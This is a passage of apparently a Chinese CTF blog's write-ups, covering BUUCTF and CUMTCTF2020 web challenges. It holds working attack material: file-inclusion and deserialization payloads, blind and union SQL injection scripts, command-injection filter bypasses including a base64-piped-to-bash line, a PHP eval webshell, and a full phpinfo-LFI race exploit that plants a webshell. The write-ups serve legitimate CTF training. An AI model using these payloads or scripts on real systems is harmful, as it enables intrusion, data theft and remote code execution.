之后进行改密码登录就可以。 文件包含[极客大挑战 2019]Secret一直查看源码最后只需要用一个文件包含就可以读出flag 12?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;xxx.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php [ACTF2020 新生赛]Include直接读取flag.php 1?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php PHP反序列化[极客大挑战 2019]PHP（简单反序列化）考察php反序列化，先下载www.zip里面有三个文件，其中有class.php，index.php，flag.php 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpinclude &#39;flag.php&#39;;error_reporting(0);class Name&#123; private $username &#x3D; &#39;nonono&#39;; private $password &#x3D; &#39;yesyes&#39;; public function __construct($username,$password)&#123; $this-&gt;username &#x3D; $username; $this-&gt;password &#x3D; $password; &#125; function __wakeup()&#123; $this-&gt;username &#x3D; &#39;guest&#39;; &#125; function __destruct()&#123; if ($this-&gt;password !&#x3D; 100) &#123; echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;; echo &quot;You name is: &quot;; echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;; echo &quot;You password is: &quot;; echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;; die(); &#125; if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123; global $flag; echo $flag; &#125;else&#123; echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;; die(); &#125; &#125;&#125;?&gt; 其中逻辑就是密码为100，并且username=’admin‘ 12345678class Name&#123; private $username = \"admin\"; private $password = \"100\";&#125;$a = new Name();$a = serialize($a); echo urlencode($a);//O:4:\"Name\":3:&#123;s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";s:3:\"100\";&#125; 最后进行url编码就行。 [ZJCTF 2019]NiZhuanSiWei看源码 12345678910111213141516171819&lt;?php $text = $_GET[\"text\"];$file = $_GET[\"file\"];$password = $_GET[\"password\"];if(isset($text)&amp;&amp;(file_get_contents($text,'r')===\"welcome to the zjctf\"))&#123; echo \"&lt;br&gt;&lt;h1&gt;\".file_get_contents($text,'r').\"&lt;/h1&gt;&lt;/br&gt;\"; //text的内容为welcome to the zjctf if(preg_match(\"/flag/\",$file))&#123; echo \"Not now!\"; //file的内容不能包含flag exit(); &#125;else&#123; include($file); //useless.php $password = unserialize($password); //反序列化 echo $password; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 看源码知道共有三个参数，所以依次判断 text的内容为welcome to the zjctf，所以我们可以用data协议 12text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctftext&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D; 之后是file，题中已经提示了useless.php，说明我们首先得拿出源码，之后包含这个文件 1file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php 拿出源码 12345678910111213&lt;?php class Flag&#123; //flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo \"&lt;br&gt;\"; return (\"U R SO CLOSE !///COME ON PLZ\"); &#125; &#125; &#125; ?&gt; 之后就是password，很明显是序列化 1O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 1http:&#x2F;&#x2F;5bfc7735-e6c3-4e4b-9612-573138d921bd.node3.buuoj.cn&#x2F;?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 查看源码就有flag [网鼎杯 2018]Fakebook（报错注入和反序列化）首先发现信息泄露 1&#x2F;user.php.bak 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phpclass UserInfo&#123; public $name = \"\"; public $age = 0; public $blog = \"\"; public function __construct($name, $age, $blog) &#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; &#125; function get($url) &#123; //创建一个curl资源 $ch = curl_init(); //设置url和相应的选项 curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); //抓取url并传递给浏览器 $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) &#123; return 404; &#125; //关闭curl资源，并且释放系统资源 curl_close($ch); //唯一的参数是curl_init()函数返回的句柄 return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog = $this-&gt;blog; return preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog); &#125;&#125; 找了好长时间，找不到注入点 后来发现，登录之后，可以查看一些信息 并且很重要的是view.php中no是可以注入的 12345678910111213141516171819import requestsdic ='''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'\"|\\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''url = \"\"flag = ''for i in range(1,50): for j in range(32,128): payload = \"http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;,2,3)\".format(i,j); r = requests.get(url=payload) if \"Fatal\" not in r.text: print(payload) flag += str(chr(j)) break print(flag)payload = \"http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;,2,3)\".format(i,j);#userspayload = 'http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_name=\"users\"),&#123;&#125;,1))=&#123;&#125;,2,3)'.format(i,j);#no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONSpayload = 'http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(data) from users),&#123;&#125;,1))=&#123;&#125;,2,3)'.format(i,j);#O:8:\"UserInfo\":3:&#123;s:4:\"name\";s:5:\"admin\";s:3:\"age\";i:11;s:4:\"blog\";s:8:\"pz1o.top\";&#125; 其实也可以报错注入，但当时以为0x7e被ban了之后就不能报错了，tcl 12345671%20and%20extractvalue(1,concat(%27$%27,(select(group_concat(database()))))%23fakebook1%20and%20extractvalue(1,concat(%27$%27,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())))%23users1%20and%20extractvalue(1,concat(%27$%27,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27)))%23no,username,passwd,data,USER,CU1%20and extractvalue(%27$%27,concat(%27$%27,(select data%20from%20users)))%23 做到这其实就不会做了。。。看大师傅的wp才知道可以no参数注入反序列化 其中payload为 10%20union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,%27O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;%27%23 至于为什么会想到这个，首先data中就是反序列化的字符串，并且，最后一个blog内容会被显示出来，这样就希望从blog中获得flag 命令执行[GXYCTF2019]Ping Ping Ping（过滤空格和有黑名单）直接ping命令执行 用分号执行两个命令 1?ip&#x3D;8.8.8.8;ls 查看有flag.php，重要的就是怎么去读取flag.php 这里发现过滤了空格，所以绕过空格的办法，简单来说有两种，第一种是${IFS} ```root@kali:~# cat flagthis is your flagroot@kali:~# cat${IFS}flagthis is your flag 122. root@kali:~# cat${IFS}$1flagthis is your flag 123. root@kali:~# cat$IFS$1flagthis is your flag 1234第二种呢是重定向符1. root@kali:~# cat&lt;&gt;flagthis is your flag 122. root@kali:~# cat&lt;flagthis is your flag 12345678这里呢我们选用$&#123;IFS&#125;来绕过，之后又发现&#123;&#125;被过滤，所以用第三个方式![image-20200831164017570](BUU%E5%88%B7%E9%A2%98&#x2F;image-20200831164017570.png)这时，我们发现flag也被过滤了，所以**黑名单绕过又有几种方式**1. 拼接 root@kali:~# a=c;b=at;c=fl;d=ag;$a$b $c$dthis is your flag 122. base64编码 root@kali:~# echo &quot;Y2F0IGZsYWc=&quot;|base64 -dthis is your flag root@kali:~# echo “Y2F0IGZsYWc=”|base64 -d|bashthis is your flag 123. 单引号、双引号 root@kali:~# c””at fl’’agthis is your flag 124. 反斜线 root@kali:~# c\\at fl\\agthis is your flag 12这里直接拼接过去就好 ?ip=8.8.8.8;a=g;cat$IFS$1fla$a.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263即可拿到flag**主要是绕过空格和绕过黑名单**## [RoarCTF 2019]Easy Calc（php字符串解析）打开源码，发现calc.php ，然后访问calc.php![image-20200901155413352](BUU%E5%88%B7%E9%A2%98&#x2F;image-20200901155413352.png)num变量过滤了一些东西，但我们用一些函数去访问时，会发现403拒绝访问，说明有waf通过网上查找，是**php的字符串解析特性**&gt; PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：&gt;&gt; 1.删除空白符 &gt;&gt; 2.将某些字符转换为下划线（包括空格）【当waf不让你过的时候，php却可以让你过】先试一试phpinfo();可以用说明我们就成功了。接下来，就是读取目录，找flag了，从phpinfo中我们可以看见一些外部函数被ban了这时就需要介绍以下几个函数1. **scandir() 函数**: 返回指定目录中的文件和目录的数组。2. **base_convert(number,formbase,tobase) 函数**: 在任意进制之间转换数字。3. **dechex() 函数**： 把十进制转换为十六进制。4. **hex2bin() 函数**： 把十六进制值的字符串转换为 ASCII 字符。5. **readfile() 函数**: 输出一个文件。6. **chr()函数** 十进制返回ascii字符7. **ord()函数** ascii字符转换为十进制8. **file_get_contents()** 把文件读入一个字符串中通常会用hex2bin(dechex(47))一起使用，这个表示&#x2F;这里&#x2F;被过滤了所以payload可以为 ? num=var_dump(scandir(chr(47)))? num=var_dump(scandir(hex2bin(dechex(47)))) 12发现flag直接readfile读取即可 ? num=var_dump(readfile(chr(47).f1agg))? num=file_get_contents(chr(47).f1agg) 12还有其他的payload ? num=base_convert(55490343972,10,36)() 1234## [ACTF2020 新生赛]Exec直接查就可以 8.8.8.8;ls /8.8.8.8;cat /flag 1234## [极客大挑战 2019]Http改请求包xff，ua，ref。 GET /Secret.php HTTP/1.1Host: node3.buuoj.cn:28918User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0 SycloverAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0referer: https://www.Sycsecret.comX-Forwarded-for: 127.0.0.1 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960# 文件上传## [SUCTF 2019]CheckIn（.user.ini）&#96;&#96;&#96;php&lt;!DOCTYPE html&gt;&lt;html lang&#x3D;&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt; &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt; &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt; &lt;title&gt;Upload Labs&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt; &lt;h2&gt;Upload Labs&lt;&#x2F;h2&gt; &lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt; &lt;label for&#x3D;&quot;file&quot;&gt;文件名：&lt;&#x2F;label&gt; &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;fileUpload&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt; &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;upload&quot; value&#x3D;&quot;提交&quot;&gt; &lt;&#x2F;form&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&lt;?php&#x2F;&#x2F; error_reporting(0);$userdir &#x3D; &quot;uploads&#x2F;&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]); &#x2F;&#x2F;这个是初始目录if (!file_exists($userdir)) &#123; mkdir($userdir, 0777, true); &#x2F;&#x2F;如果不存在，就将创建目录可写可执行&#125;file_put_contents($userdir . &quot;&#x2F;index.php&quot;, &quot;&quot;);if (isset($_POST[&quot;upload&quot;])) &#123; $tmp_name &#x3D; $_FILES[&quot;fileUpload&quot;][&quot;tmp_name&quot;]; $name &#x3D; $_FILES[&quot;fileUpload&quot;][&quot;name&quot;]; if (!$tmp_name) &#123; &#x2F;&#x2F;判断是否存在上传文件 die(&quot;filesize too big!&quot;); &#125; if (!$name) &#123; &#x2F;&#x2F;文件名不许为空 die(&quot;filename cannot be empty!&quot;); &#125; $extension &#x3D; substr($name, strrpos($name, &quot;.&quot;) + 1); &#x2F;&#x2F;截取后缀名 if (preg_match(&quot;&#x2F;ph|htacess&#x2F;i&quot;, $extension)) &#123; die(&quot;illegal suffix!&quot;); &#x2F;&#x2F;正则匹配，ph和htaccess都不可以 &#125; if (mb_strpos(file_get_contents($tmp_name), &quot;&lt;?&quot;) !&#x3D;&#x3D; FALSE) &#123; die(&quot;&lt;? in contents!&quot;); &#x2F;&#x2F;文件内容不许有&lt;? &#125; $image_type &#x3D; exif_imagetype($tmp_name); &#x2F;&#x2F;判断一个图像的类型 if (!$image_type) &#123; die(&quot;exif_imagetype:not image!&quot;); &#125; $upload_file_path &#x3D; $userdir . &quot;&#x2F;&quot; . $name; move_uploaded_file($tmp_name, $upload_file_path); echo &quot;Your dir &quot; . $userdir. &#39; &lt;br&gt;&#39;; echo &#39;Your files : &lt;br&gt;&#39;; var_dump(scandir($userdir));&#125; 源码如上，可以学习一下 其中exif_imagetype()可以记录一下 但我们可以通过给上传脚本加上相应的幻数头字节就可以绕过： JPG ：FF D8 FF E0 00 10 4A 46 49 46 GIF(相当于文本的GIF89a)：47 49 46 38 39 61 PNG： 89 50 4E 47 这里想要上传成功，要借助一下.user.ini https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html .user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置） 其中有两个配置，可以用来制造后门：auto_append_file、auto_prepend_file指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中： 1&gt;auto_prepend_file&#x3D;test.jpg 那么当我们访问此目录下的任何一个文件时，都会去包含test.jpg 常见姿势： 比如，某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。 这里最后就要写一个图片马了 1&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;a&#39;]);&lt;&#x2F;script&gt; 然后把两个上传，连菜刀就可以拿到flag了 主要来学习一下文件上传的操作 [极客大挑战 2019]Upload这个直接上传就可以，改一下文件内容的头，然后改下文件名phtml 菜刀连接拿flag [ACTF2020 新生赛]BackupFile备份文件index.php.bak 两个等号弱等于，直接123拿flag [ACTF2020 新生赛]Upload上传改名字，拿flag [极客大挑战 2019]Knife直接菜刀连接，根目录下有flag","categories":[{"name":"BUU","slug":"BUU","permalink":"https://pz1o.top/categories/BUU/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://pz1o.top/tags/CTF/"},{"name":"刷题","slug":"刷题","permalink":"https://pz1o.top/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"CUMTCTF2020","slug":"CUMTCTF2020","date":"2020-09-25T11:00:00.000Z","updated":"2020-11-20T14:18:32.426Z","comments":true,"path":"2020/09/25/CUMTCTF2020/","link":"","permalink":"https://pz1o.top/2020/09/25/CUMTCTF2020/","excerpt":"","text":"CUMTCTF2020第一次打比赛，大三的师傅们好强 webWeb签到 get传入参数1，post传入参数2，然后文件包含flag.php，查看源码拿flag 1#CUMTCTF&#123;179055b4-e8f5-42d2-bfe4-027d15e946b2&#125; Babysqli过滤空格的sql注入，可以用/**/绕过,用union注入 payload 123456789#查表1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()),5,6,7,8##emails,users1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,(select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&#39;emails&#39;),5,6,7,8##id,email_id1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,(select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&#39;users&#39;),5,6,7,8##user_id,first_name,last_name,user,password,avatar,last_login,failed_login1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,(select&#x2F;**&#x2F;group_concat(password)&#x2F;**&#x2F;from&#x2F;**&#x2F;users),5,6,7,8##CUMTCTF&#123;27ec8034-c9fe-0cfd-d92a-84362ecf0e42&#125; Secret1view-source:http:&#x2F;&#x2F;202.119.201.197:13005&#x2F;secret.jpg 直接看图片的源代码，发现后面有php 1234567891011121314151617181920212223242526272829303132&lt;?phperror_reporting(0);include_once('flag.php');if(isset($_GET['param1']))&#123; $str1=$_GET['param1']; if(file_get_contents($str1)!=='Suvin_wants_a_girlfriend') die(\"Suvin doesn't like you\"); if(isset($_GET['param2']))&#123; $str2=$_GET['param2']; if(!is_numeric($str2)) die('Suvin prefers strings of Numbers'); else if($str2&lt;3600*24*30) die('Suvin says the num is too short'); else if($str2&gt;3600*24*31) die('Suvin says the num is too long'); else &#123; echo \"Suvin says he's falling in love with you!\".\"&lt;/br&gt;\"; sleep(intval($str2)); &#125; if (isset($_POST['param1']) &amp;&amp; isset($_POST['param2'])) &#123; $str1=$_POST['param1']; $str2=$_POST['param2']; if(strlen($str1)&gt;1000) die(\"It's too long\"); if(((string)$str1!==(string)$str2)&amp;&amp;(sha1($str1)===sha1($str2))) echo $flag; else die(\"It's so similar to md5\"); &#125; &#125;&#125; 首先get传入param1要和一个字符串相等可以用data:// get传入param2要判断这个参数是否是数字并且要限制了范围，在加上有sleep，很自然的就想到了科学计数法 因此payload 1http:&#x2F;&#x2F;202.119.201.197:13005&#x2F;index.php?param2&#x3D;0.26e07&amp;param1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,Suvin_wants_a_girlfriend 接下来是post的两个参数要的是字符串下的参数1和参数2不强等，但sha1加密强等，这里就不能用zhe数组绕过了 这里找两个sha1加密的不一样的字符串,找的是那个pdf，然后提取前面的内容即可，最后抓包改参数1和参数2拿flag Babysqli2过滤了单引号和字符串截断函数substr()和mid()并且无回显，因为有正确和错误登录界面那应该就是盲注了 这里用left来截取字符串，并且用十六进制来替换单引号及其里面的内容 直接放脚本 1234567891011121314151617181920212223242526272829import binasciiimport requests#dict = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.-&#123;&#125;,'dict='''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'\"|\\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''url = 'http://202.119.201.197:13004/index.php'flag = ''j = ''for i in range(1,400): for a in dict: #payload = \"or/**/1=(case/**/when/**/(left(database(),&#123;&#125;)=0x&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)#\".format(i, binascii.b2a_hex(j + a)) #payload = \"or/**/1=(case/**/when/**/(left((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;&#125;)=0x&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)#\".format(i,binascii.b2a_hex(j+a)) #payload = \"or/**/1=(case/**/when/**/(left((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x7573657273),&#123;&#125;)=0x&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)#\".format(i,binascii.b2a_hex(j + a)) payload = \"or/**/1=(case/**/when/**/(left((select/**/group_concat(password)/**/from/**/users),&#123;&#125;)=0x&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)#\".format(i, binascii.b2a_hex(j + a)) #print(payload) #cumtctf #emails users #id id username,password data = &#123; 'username' : \"100\\\\\", 'password' : payload &#125; r = requests.session() res = r.post(url=url,data=data) #print(res.content) if 'Wrong username' not in res.content: j += a flag +=a break print(flag) 好像是在最后，多跑一会就出来了 Try:GET_file先扫目录发现有phpinfo.php 包含一下发现有文件包含漏洞 之后又包含敏感文件 1?file&#x3D;&#x2F;etc&#x2F;passwd 这里有一个phpinfo上传文件再包含 1234567891011121314151617在给PHP发送POST数据包时，如果数据包里包含文件区块，无论访问的代码中是否有处理文件上传的逻辑，php都会将这个文件保存成一个临时文件（通常是&#x2F;tmp&#x2F;php[6个随机字符]），这个临时文件在请求结束后就会被删除，同时，phpinfo页面会将当前请求上下文中所有变量都打印出来。但是文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，将这个文件名发送给文件包含漏洞页面。因为在第一个请求结束时，临时文件就会被删除，第二个请求就无法进行包含。但是这并不代表我们没有办法去利用这点上传恶意文件，只要发送足够多的数据，让页面还未反应过来，就上传我们的恶意文件，然后文件包含：1）发送包含了webshell的上传数据包给phpinfo，这个数据包的header，get等位置一定要塞满垃圾数据；2）phpinfo这时会将所有数据都打印出来，其中的垃圾数据会将phpinfo撑得非常大3）PHP默认缓冲区大小是4096，即PHP每次返回4096个字节给socket连接4）所以，我们直接操作原生socket，每次读取4096个字节，只要读取到的字符里包含临时文件名，就立即发送第二个数据包5）此时，第一个数据包的socket连接其实还没有结束，但是PHP还在继续每次输出4096个字节，所以临时文件还未被删除6）我们可以利用这个时间差，成功包含临时文件，最后getshell 这里有现成的exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190#!/usr/bin/python import sysimport threadingimport socketdef setup(host, port): TAG=\"Security Test\" PAYLOAD=\"\"\"%s\\r&lt;?php file_put_contents('/tmp/g', '&lt;?=eval($_REQUEST[1])?&gt;')?&gt;\\r\"\"\" % TAG REQ1_DATA=\"\"\"-----------------------------7dbff1ded0714\\rContent-Disposition: form-data; name=\"dummyname\"; filename=\"test.txt\"\\rContent-Type: text/plain\\r\\r%s-----------------------------7dbff1ded0714--\\r\"\"\" % PAYLOAD padding=\"A\" * 5000 REQ1=\"\"\"POST /phpinfo.php?a=\"\"\"+padding+\"\"\" HTTP/1.1\\rCookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=\"\"\"+padding+\"\"\"\\rHTTP_ACCEPT: \"\"\" + padding + \"\"\"\\rHTTP_USER_AGENT: \"\"\"+padding+\"\"\"\\rHTTP_ACCEPT_LANGUAGE: \"\"\"+padding+\"\"\"\\rHTTP_PRAGMA: \"\"\"+padding+\"\"\"\\rContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\\rContent-Length: %s\\rHost: %s\\r\\r%s\"\"\" %(len(REQ1_DATA),host,REQ1_DATA) #modify this to suit the LFI script LFIREQ=\"\"\"GET /index.php?file=%s HTTP/1.1\\rUser-Agent: Mozilla/4.0\\rProxy-Connection: Keep-Alive\\rHost: %s\\r\\r\\r\"\"\" return (REQ1, TAG, LFIREQ)def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s2.connect((host, port)) s.send(phpinforeq) d = \"\" while len(d) &lt; offset: d += s.recv(offset) try: i = d.index(\"[tmp_name] =&amp;gt; \") fn = d[i+17:i+31] except ValueError: return None s2.send(lfireq % (fn, host)) d = s2.recv(4096) s.close() s2.close() if d.find(tag) != -1: return fncounter=0class ThreadWorker(threading.Thread): def __init__(self, e, l, m, *args): threading.Thread.__init__(self) self.event = e self.lock = l self.maxattempts = m self.args = args def run(self): global counter while not self.event.is_set(): with self.lock: if counter &gt;= self.maxattempts: return counter+=1 try: x = phpInfoLFI(*self.args) if self.event.is_set(): break if x: print \"\\nGot it! Shell created in /tmp/g\" self.event.set() except socket.error: return def getOffset(host, port, phpinforeq): \"\"\"Gets offset of tmp_name in the php output\"\"\" s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host,port)) s.send(phpinforeq) d = \"\" while True: i = s.recv(4096) d+=i if i == \"\": break # detect the final chunk if i.endswith(\"0\\r\\n\\r\\n\"): break s.close() i = d.find(\"[tmp_name] =&amp;gt; \") if i == -1: raise ValueError(\"No php tmp_name in phpinfo output\") print \"found %s at %i\" % (d[i:i+10],i) # padded up a bit return i+256def main(): print \"LFI With PHPInfo()\" print \"-=\" * 30 if len(sys.argv) &lt; 2: print \"Usage: %s host [port] [threads]\" % sys.argv[0] sys.exit(1) try: host = socket.gethostbyname(sys.argv[1]) except socket.error, e: print \"Error with hostname %s: %s\" % (sys.argv[1], e) sys.exit(1) port=80 try: port = int(sys.argv[2]) except IndexError: pass except ValueError, e: print \"Error with port %d: %s\" % (sys.argv[2], e) sys.exit(1) poolsz=10 try: poolsz = int(sys.argv[3]) except IndexError: pass except ValueError, e: print \"Error with poolsz %d: %s\" % (sys.argv[3], e) sys.exit(1) print \"Getting initial offset...\", reqphp, tag, reqlfi = setup(host, port) offset = getOffset(host, port, reqphp) sys.stdout.flush() maxattempts = 1000 e = threading.Event() l = threading.Lock() print \"Spawning worker pool (%d)...\" % poolsz sys.stdout.flush() tp = [] for i in range(0,poolsz): tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag)) for t in tp: t.start() try: while not e.wait(1): if e.is_set(): break with l: sys.stdout.write( \"\\r% 4d / % 4d\" % (counter, maxattempts)) sys.stdout.flush() if counter &gt;= maxattempts: break print if e.is_set(): print \"Woot! \\m/\" else: print \":(\" except KeyboardInterrupt: print \"\\nTelling threads to shutdown...\" e.set() print \"Shuttin' down...\" for t in tp: t.join()if __name__==\"__main__\": main() payload： 12http:&#x2F;&#x2F;202.119.201.197:13077&#x2F;?file&#x3D;&#x2F;tmp&#x2F;g&amp;1&#x3D;system(%27cat%20&#x2F;tmp&#x2F;7IDUrqGOt8PMATm852&#x2F;flag.txt%27);#CUMTCTF&#123;Orz_to_php1nf0&#125; 最后直接命令执行，但好像找了好久才看见flag re连个签到的分都不给你直接010查看搜cumtctf可以看见flag python题禁止py直接上脚本 1234567891011# flag = input()cipher = [80,70,94,71,80,71,85,104,86,39,64,106,76,67,106,71,123,92,125,76,37,106,103,118,80,35,119,32,110]## if(len(flag==29)):# for i,n in enumerate(flag):# if ord(n) ^ 19 != cipher[i]:## else:for i in cipher: a = i ^ 19 print(chr(a),end='') 兄弟们快来帮帮萄萄脱壳拖入IDA可以看见flag pwntest_ncnc 监听领flag babystack脱入010并输入字符串看是直接可以bash 直接读取就可以拿flag crypto幼儿园的密码题rsa，已知e n c 求m 123456789101112131415# e = 0x10001# n = 0xeb80cc09ed9780fe25cadf7c168d2da3ea24e35237e92faf5ee0d7980c11302f# c = 0x596d5175112e346590aae5a3d633e71d2d12b28b60f08f8efa82fc092acc8c2d# Hint ： google RSimport gmpy2from Crypto.Util.number import *e=0x10001c = 0x596d5175112e346590aae5a3d633e71d2d12b28b60f08f8efa82fc092acc8c2dp = 324350545929838254331191385863847627003q = 328413456989577256301798468872388310877n = 0xeb80cc09ed9780fe25cadf7c168d2da3ea24e35237e92faf5ee0d7980c11302fd = gmpy2.invert(e,(p-1)*(q-1))m = pow(c,d,n)print(long_to_bytes(m)) 可以看见flag 小学生的密码题这个很明显就可以看出规律就是一般都是以8开头 然后我有点懒（说实话是不太会写）就一个一个拼接出flag misc真·签到题zip伪加密然后base64解密拿flag 别做题了听歌吧mp3隐写 